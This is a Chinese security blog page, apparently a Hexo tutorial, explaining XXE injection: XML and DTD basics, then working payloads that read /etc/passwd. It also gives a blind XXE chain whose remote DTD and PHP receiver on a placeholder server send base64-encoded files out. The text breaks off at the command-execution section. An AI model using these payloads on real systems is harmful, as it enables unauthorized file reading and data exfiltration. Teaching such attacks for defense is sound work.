@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>web安全-xxe漏洞详解 | Hexo</title>
+  <meta name="keywords" content=" -web安全 ">
+  <meta name="description" content="web安全-xxe漏洞详解 | Hexo">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="any.run">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-在线工具">
+<meta property="og:url" content="http://yoursite.com/2020/04/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="any.run">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-04-19T14:22:38.052Z">
+<meta property="article:modified_time" content="2019-07-10T23:45:36.119Z">
+<meta property="article:author" content="一坨奔跑的蜗牛">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/blog.jpg">
+
+<link href="/BetaSecLab.github.io/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/BetaSecLab.github.io/css/hl_theme/gruvbox-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/BetaSecLab.github.io/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/BetaSecLab.github.io/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="/BetaSecLab.github.io">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/BetaSecLab.github.io/" class="avatar_target">
+    <img class="avatar" src="/BetaSecLab.github.io/img/blog.jpg" />
+</a>
+<div class="author">
+    <span>一坨奔跑的蜗牛</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/a-running-snail2333" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:2072622989@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=2072622989&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(13)</small></div></li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="13">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color5">kali</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">labs</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">-web安全</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">内网渗透</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">-内网渗透</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">-护网行动</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">随笔</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/07/02/kali%20%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%BE%8E%E5%8C%96/"
+           data-tag="kali"
+           data-author="" >
+            <span class="post-title" title="kali 配置与美化">kali 配置与美化</span>
+            <span class="post-date" title="2019-07-02 00:00:00">2019/07/02</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2020/04/19/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2020-04-19 15:00:16">2020/04/19</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/05/17/labs-DC_6/"
+           data-tag="labs"
+           data-author="" >
+            <span class="post-title" title="labs-vulhub_DC6">labs-vulhub_DC6</span>
+            <span class="post-date" title="2019-05-17 00:00:00">2019/05/17</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/04/01/web%E5%AE%89%E5%85%A8-xxe/"
+           data-tag="-web安全"
+           data-author="" >
+            <span class="post-title" title="web安全-xxe漏洞详解">web安全-xxe漏洞详解</span>
+            <span class="post-date" title="2019-04-01 00:00:00">2019/04/01</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/03/02/web%E5%AE%89%E5%85%A8-xss/"
+           data-tag="-web安全"
+           data-author="" >
+            <span class="post-title" title="web安全-xss">web安全-xss</span>
+            <span class="post-date" title="2019-03-02 10:12:20">2019/03/02</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/03/09/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"
+           data-tag="-web安全"
+           data-author="" >
+            <span class="post-title" title="web安全-文件上传漏洞">web安全-文件上传漏洞</span>
+            <span class="post-date" title="2019-03-09 00:00:00">2019/03/09</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/04/08/web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
+           data-tag="-web安全"
+           data-author="" >
+            <span class="post-title" title="web安全-文件包含漏洞">web安全-文件包含漏洞</span>
+            <span class="post-date" title="2019-04-08 00:00:00">2019/04/08</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2020/04/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/"
+           data-tag="内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透-在线工具">内网渗透-在线工具</span>
+            <span class="post-date" title="2020-04-19 22:22:38">2020/04/19</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/04/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/"
+           data-tag="-内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透-发现内网主机">内网渗透-发现内网主机</span>
+            <span class="post-date" title="2019-04-02 00:00:00">2019/04/02</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E6%8F%90%E6%9D%83%E7%AF%87/"
+           data-tag="-内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透-提权篇">内网渗透-提权篇</span>
+            <span class="post-date" title="2019-04-10 08:12:20">2019/04/10</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/03/07/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
+           data-tag="-内网渗透"
+           data-author="" >
+            <span class="post-title" title="内网渗透-域环境搭建">内网渗透-域环境搭建</span>
+            <span class="post-date" title="2019-03-07 10:12:20">2019/03/07</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2019/06/20/%E6%8A%A4%E7%BD%912019-%E7%AC%94%E8%AE%B0/"
+           data-tag="-护网行动"
+           data-author="" >
+            <span class="post-title" title="2019-护网笔记">2019-护网笔记</span>
+            <span class="post-date" title="2019-06-20 19:12:20">2019/06/20</span>
+        </a>
+        
+        <a  class=""
+           href="/BetaSecLab.github.io/2020/04/19/%E9%9A%8F%E7%AC%94/"
+           data-tag="随笔"
+           data-author="" >
+            <span class="post-title" title="a_running_snail">a_running_snail</span>
+            <span class="post-date" title="2020-04-19 22:22:38">2020/04/19</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-web安全-xxe" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">web安全-xxe漏洞详解</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color2">-web安全</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-04-01 12:50:28'>2019-04-01 00:00</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-XML基础知识"><span class="toc-text">0x00 XML基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-XXE漏洞原理"><span class="toc-text">0x01 XXE漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-XXE漏洞利用"><span class="toc-text">0x02 XXE漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-有回显XXE、"><span class="toc-text">1) 有回显XXE、</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Blind-XXE、"><span class="toc-text">2) Blind XXE、</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-XXE漏洞绕过方式"><span class="toc-text">0x03 XXE漏洞绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#有回显的XXE漏洞利用："><span class="toc-text">有回显的XXE漏洞利用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无回显的XXE漏洞利用："><span class="toc-text">无回显的XXE漏洞利用：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-XML造成的危害"><span class="toc-text">0x04 XML造成的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-XML注入预防"><span class="toc-text">0x05 XML注入预防</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>XML外部实体注入简称XXE漏洞</strong>：XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
+<a id="more"></a>
+<p>0x00 XML基础知识<br>0x01 XXE漏洞原理<br>0x02 XXE漏洞利用<br>0x03 XXE漏洞绕过方式<br>0x04 XXE造成的危害<br>0x05 XML注入预防</p>
+<h1 id="0x00-XML基础知识"><a href="#0x00-XML基础知识" class="headerlink" title="0x00 XML基础知识"></a><strong>0x00 XML基础知识</strong></h1><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;?xml version=”<span class="number">1.0</span>”&gt;</span>           <span class="comment">//xml声明</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;!DOCTYPE  note [</span></span><br><span class="line"><span class="params">&lt;!ELEMENT note (to, from, heading, body)&gt;</span></span><br><span class="line"><span class="params">&lt;!ELEMENT to   (#PCDATA)&gt;</span>                     <span class="comment">//文档类型定义</span></span><br><span class="line"><span class="params">&lt;!ELEMENT from (#PCDATA)&gt;</span></span><br><span class="line"><span class="params">&lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="params">&lt;!ELEMENT body   (#PCDATA)&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"><span class="params">&lt;note&gt;</span></span><br><span class="line"><span class="params">&lt;to&gt;</span>George<span class="params">&lt;/to&gt;</span></span><br><span class="line"><span class="params">&lt;from&gt;</span>John<span class="params">&lt;/from&gt;</span>                                 <span class="comment">//文档元素</span></span><br><span class="line"><span class="params">&lt;heading&gt;</span>Reminder<span class="params">&lt;/heading&gt;</span></span><br><span class="line"><span class="params">&lt;body&gt;</span>Don’t forget the meeting<span class="params">&lt;/body&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-XXE漏洞原理"><a href="#0x01-XXE漏洞原理" class="headerlink" title="0x01 XXE漏洞原理"></a><strong>0x01 XXE漏洞原理</strong></h1><p>XXE Injection （XML External Entity Injection，XML 外部实体注入攻击）攻击者可以通过 XML 的外部实体来获取服务器中本应被保护的数据。对于XXE漏洞最为关键的部分是DTD文档类型，DTD 的作用是定义 XML 文档的合法构建模块。当允许引用外部实体时，通过恶意构造，可以导致任意文件读取、执行系统命令、探测内网端口、攻击内网网站等危害。DTD 可以在 XML 文档内声明，也可以外部引用；libxml2.9.1及以后，默认不再解析外部实体。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内部声明 DTD             </span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br><span class="line">引用外部 DTD                 </span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">PBULIC</span> <span class="meta-string">"public_ID"</span> <span class="meta-string">"文件名"</span>&gt;</span></span><br><span class="line">/或者</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"文件名"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 在解析 XML 时，实体将会被替换成相应的引用内容,xml文档如下所示：<br> (1) 包含内部实体的 XML 文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE c [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"Copyright xx.xx.xx"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>(2) 包含外部实体的 XML 文档</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE c [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"Copyright xx.xx.xx"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-XXE漏洞利用"><a href="#0x02-XXE漏洞利用" class="headerlink" title="0x02 XXE漏洞利用"></a><strong>0x02 XXE漏洞利用</strong></h1><p>(1) XML 解析器解析外部实体时支持多种协议</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libxml2：<span class="built_in">file</span>、<span class="keyword">http</span>、<span class="keyword">ftp</span></span><br><span class="line">PHP：<span class="built_in">file</span>、<span class="keyword">http</span>、<span class="keyword">ftp</span>、php、<span class="built_in">compress</span>.zlib、<span class="built_in">compress</span>.bzip2、data、glob、phar</span><br><span class="line">Java：<span class="built_in">file</span>、<span class="keyword">http</span>、<span class="keyword">ftp</span>、<span class="keyword">https</span>、jar、netdoc、mailto、gopher</span><br><span class="line">.NET：<span class="built_in">file</span>、<span class="keyword">http</span>、<span class="keyword">ftp</span>、<span class="keyword">https</span></span><br></pre></td></tr></table></figure>
+<p>(2)    不同解析器可能默认对于外部实体会有不同的处理规则，有些可能不会对外部实体进行解析：   PHP：DOM、SimpleXML； .NET：System.Xml.XmlDocument、System.Xml.XmlReader。<br>对于XXE通常有两种利用方式：</p>
+<h2 id="1-有回显XXE、"><a href="#1-有回显XXE、" class="headerlink" title="1) 有回显XXE、"></a><strong>1) 有回显XXE、</strong></h2><p>攻击者通过正常的回显或报错将外部实体中的内容读取出来。file 协议读取文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE c [</span></span><br><span class="line"><span class="meta">      <span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Blind-XXE、"><a href="#2-Blind-XXE、" class="headerlink" title="2) Blind XXE、"></a><strong>2) Blind XXE、</strong></h2><p>服务器没有回显，只能使用 Blind XXE 来构建一条带外数据通道提取数据; Blind XXE 主要使用了 DTD 约束中的参数实体和内部定义实体。参数实体：一个只能在 DTD 中定义和使用的实体，一般引用时用 % 作为前缀; 内部定义实体：在一个实体中定义的一个实体，即嵌套定义：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!DOCTYPE c [</span></span></span><br><span class="line"><span class="xml">       <span class="meta">&lt;!ENTITY  % a <span class="meta-string">"&lt;!ENTITY b 'http://www.xxx.com'&gt;"</span></span></span></span><br><span class="line"><span class="perl">     	%a;</span></span><br><span class="line"><span class="xml">    ]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>Blind XXE 采用嵌套形式建立带外数据通道，利用参数实体将本地内容读出来后，作为外部实体中的 URL 中的参数向其指定服务器发起请求，然后在其指定服务器的日志（Apache 日志）中读出文件的内容（指定服务器即攻击者的服务器）;DTD 中使用 % 来定义的参数实体只能在外部子集中使用，或由外部文件定义参数实体，引用到 XML 文件的 DTD 来使用; 有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体，所以需要将嵌套的实体声明放在外部文件中。</p>
+<h1 id="0x03-XXE漏洞绕过方式"><a href="#0x03-XXE漏洞绕过方式" class="headerlink" title="0x03 XXE漏洞绕过方式"></a><strong>0x03 XXE漏洞绕过方式</strong></h1><h2 id="有回显的XXE漏洞利用："><a href="#有回显的XXE漏洞利用：" class="headerlink" title="有回显的XXE漏洞利用："></a><strong>有回显的XXE漏洞利用：</strong></h2><p><em>方式一、</em><br>xml内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/1.png" alt="enter description here"><br><em>方式二、</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY  % d  SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot; &gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;b;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+<p>远程vps服务器 www/html文件下建立evil.dtd文件，文件内容如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY <span class="selector-tag">b</span> SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/2.png" alt="enter description here"></p>
+<h2 id="无回显的XXE漏洞利用："><a href="#无回显的XXE漏洞利用：" class="headerlink" title="无回显的XXE漏洞利用："></a><strong>无回显的XXE漏洞利用：</strong></h2><p>xml内容为：</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY  % <span class="meta-keyword">file</span>  <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=/etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY  % <span class="meta-keyword">remote</span>  <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/evil2.dtd"</span> &gt;</span></span></span><br><span class="line"><span class="perl">%remote;</span></span><br><span class="line"><span class="perl">%all;</span></span><br><span class="line"><span class="perl">%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>远程端vps上在www/html文件夹下放置两个文件一个为test.php文件用于接收信息，另一个为test.dtd<br>其中test.php代码如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = <span class="string">"./test.txt"</span>;</span></span><br><span class="line"><span class="php">$content = base64_decode($_GET[<span class="string">'file'</span>]); </span></span><br><span class="line"><span class="php">file_put_contents($file , $content);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>test.dtd中代码如下：</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="keyword">ENTITY</span> % <span class="keyword">all</span></span><br><span class="line"><span class="string">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://ip/xxe/test.php?file=%file;'&gt;"</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/3.jpg" alt="enter description here"></p>
+<h1 id="0x04-XML造成的危害"><a href="#0x04-XML造成的危害" class="headerlink" title="0x04 XML造成的危害"></a><strong>0x04 XML造成的危害</strong></h1><p><em>(1) 读取任意文件</em><br>xml内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/1.png" alt="enter description here"></p>
+<p><em>(2) 执行系统命令</em><br>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能执行系统命令；</p>
